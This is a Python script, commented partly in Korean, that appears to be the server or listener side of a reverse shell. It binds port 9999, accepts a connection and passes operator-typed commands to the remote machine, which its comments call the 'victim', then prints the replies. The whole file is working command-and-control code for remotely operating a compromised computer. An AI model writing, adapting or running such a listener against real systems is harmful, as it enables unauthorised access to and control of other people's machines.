import socket
import sys

# 새로운 소켓 생성
def create_socket():
    try:
        global host 
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("Err: " + str(msg))

# Binding Socket and Listen for connection
def bind_socket():
    try:
        global host 
        global port
        global s

        print("Binding the Port: " + str(port))
        s.bind((host, port))
        # 계속 connection을 기다리고 있으면서 최대 5개의 Connection을 하겠다는 뜻
        s.listen(5)

    except socket.error as msg:
        print("Socket Binding Err: " + str(msg) + "\nRetrying")
        # 무한 루프 조심
        bind_socket()

# Establish connection with a client
def socket_accept():
    conn, address = s.accept()
    # accept이 돼야지 다음 블록으로 넘어간다
    print("connection 성공")
    print("IP: " + address[0])
    print("Port: " + str(address[1]))

    # connect 된 conn객체로 여러가지 작업을 한다
    send_commands(conn)

    # 작업이 끝나면 소켓을 닫아준다
    conn.close()

# send command to victim
def send_commands(conn):
    while True:
        cmd = input()
        if cmd == "quit":
            conn.close()
            s.close()
            sys.exit()
        
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8")
            print(client_response, end="")

def main():
    create_socket()
    bind_socket()
    socket_accept()

main()

